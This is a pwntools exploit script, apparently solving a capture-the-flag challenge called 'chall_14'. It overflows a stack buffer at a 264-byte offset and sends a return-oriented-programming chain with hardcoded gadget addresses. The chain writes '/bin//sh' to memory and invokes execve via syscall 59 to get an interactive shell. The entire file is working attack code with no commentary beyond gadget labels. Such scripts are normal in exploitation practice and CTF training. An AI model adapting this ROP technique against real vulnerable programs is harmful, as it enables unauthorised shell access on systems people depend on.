from pwn import *

elf = ELF("./chall_14")
p = process("./chall_14")

# ROP gadgets and addresses
pop_rsi_ret = p64(0x000000000040f3fe)
data_section_address = p64(0x00000000004c00e0)
pop_rax_ret = p64(0x00000000004494a7)
mov_qword_ptr_rsi_rax_ret = p64(0x000000000047b9c5)
xor_rax_ret = p64(0x0000000000443b00)
pop_rdi_ret = p64(0x00000000004018ca)
pop_rdx_ret = p64(0x00000000004017cf)
syscall_ret = p64(0x00000000004012d3)
add_rax_1_ret = p64(0x00000000004709f0)

rop = b''
rop += pop_rsi_ret
rop += data_section_address
rop += pop_rax_ret
rop += b'/bin//sh'
rop += mov_qword_ptr_rsi_rax_ret
rop += pop_rsi_ret
rop += p64(0x00000000004c00e8)
rop += xor_rax_ret
rop += mov_qword_ptr_rsi_rax_ret
rop += pop_rdi_ret
rop += data_section_address
rop += pop_rsi_ret
rop += p64(0x00000000004c00e8)
rop += pop_rdx_ret
rop += p64(0x00000000004c00e8)
rop += xor_rax_ret
rop += add_rax_1_ret * 59
rop += syscall_ret

offset = 264
payload = b's' * offset + rop

p.sendline(payload)
p.interactive()
